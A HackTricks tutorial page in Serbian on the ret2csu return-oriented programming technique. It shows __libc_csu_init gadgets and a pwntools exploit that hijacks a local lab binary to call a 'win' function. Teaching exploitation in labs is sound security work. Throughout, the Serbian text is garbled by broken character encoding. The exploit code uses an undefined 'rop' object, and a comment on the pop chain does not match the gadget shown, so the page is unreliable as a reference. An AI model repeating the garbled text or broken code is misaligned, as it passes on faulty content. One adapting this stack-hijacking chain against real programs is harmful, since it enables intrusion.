# Ret2csu

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne Informacije

**ret2csu** je hakovanje tehnika koja se koristi kada pokuÅ¡avate preuzeti kontrolu nad programom, ali ne moÅ¾ete pronaÄ‡i **gadgete** koje obiÄno koristite za manipulisanje ponaÅ¡anjem programa.&#x20;

Kada program koristi odreÄ‘ene biblioteke (poput libc), ima neke ugraÄ‘ene funkcije za upravljanje naÄinom na koji razliÄiti delovi programa komuniciraju meÄ‘usobno. MeÄ‘u ovim funkcijama postoje neke skrivene dragocenosti koje mogu delovati kao naÅ¡i nedostajuÄ‡i gadgeti, posebno jedna nazvana `__libc_csu_init`.

### ÄŒarobni Gadgeti u \_\_libc\_csu\_init

U `__libc_csu_init`, postoje dve sekvence instrukcija (naÅ¡i "Äarobni gadgeti") koji se istiÄu:

1. Prva sekvencija nam omoguÄ‡ava postavljanje vrednosti u nekoliko registara (rbx, rbp, r12, r13, r14, r15). To su poput slotova gde moÅ¾emo Äuvati brojeve ili adrese koje Å¾elimo koristiti kasnije.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
Ova sprava nam omoguÄ‡ava kontrolu ovih registara tako Å¡to izvlaÄi vrednosti sa steka i smeÅ¡ta ih u njih.

2. Drugi niz koristi vrednosti koje smo postavili da uradi nekoliko stvari:
* **Premesti odreÄ‘ene vrednosti u druge registre**, pripremajuÄ‡i ih za koriÅ¡Ä‡enje kao parametre u funkcijama.
* **IzvrÅ¡i poziv na lokaciju** odreÄ‘enu sabiranjem vrednosti u r15 i rbx, zatim mnoÅ¾enjem rbx sa 8.
```
mov rdx, r14;
mov rsi, r13;
mov edi, r12d;
call qword [r15 + rbx*8];
```
## Primer

Zamislite da Å¾elite da napravite syscall ili pozovete funkciju poput `write()`, ali vam trebaju specifiÄne vrednosti u registrima `rdx` i `rsi` kao parametri. ObiÄno biste traÅ¾ili gedÅ¾ete koji direktno postavljaju ove registre, ali ne moÅ¾ete pronaÄ‡i nijedan.

Ovde dolazi do izraÅ¾aja **ret2csu**:

1. **Postavljanje Registara**: Koristite prvi magiÄni gedÅ¾et da skine vrednosti sa steka i stavi ih u rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx) i r15.
2. **KoriÅ¡Ä‡enje Drugog GedÅ¾eta**: Sa postavljenim registrima, koristite drugi gedÅ¾et. Ovo vam omoguÄ‡ava da premestite vaÅ¡e izabrane vrednosti u `rdx` i `rsi` (iz r14 i r13, redom), pripremajuÄ‡i parametre za poziv funkcije. Å taviÅ¡e, kontroliÅ¡uÄ‡i `r15` i `rbx`, moÅ¾ete naterati program da pozove funkciju smeÅ¡tenu na adresi koju izraÄunate i stavite u `[r15 + rbx*8]`.

Imate [**primer koriÅ¡Ä‡enja ove tehnike i objaÅ¡njenje ovde**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), a ovo je konaÄan eksploit koji je koriÅ¡Ä‡en:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
{% hint style="warning" %}
Imajte na umu da prethodni exploit nije namenjen za **`RCE`**, veÄ‡ samo da pozove funkciju nazvanu `win` (uzimanje adrese `win` sa stdin pozivanjem gets u ROP lancu i Äuvanje u r15) sa treÄ‡im argumentom vrednosti `0xdeadbeefcafed00d`.
{% endhint %}

### ZaÅ¡to ne koristiti libc direktno?

ObiÄno su ovi sluÄajevi takoÄ‘e ranjivi na [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/), ali ponekad morate kontrolisati viÅ¡e parametara nego Å¡to se lako moÅ¾e kontrolisati pomoÄ‡u gedÅ¾eta koje direktno pronaÄ‘ete u libc-u. Na primer, funkcija `write()` zahteva tri parametra, a **pronaÄ‡i gedÅ¾ete za postavljanje svih ovih direktno moÅ¾da nije moguÄ‡e**.

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
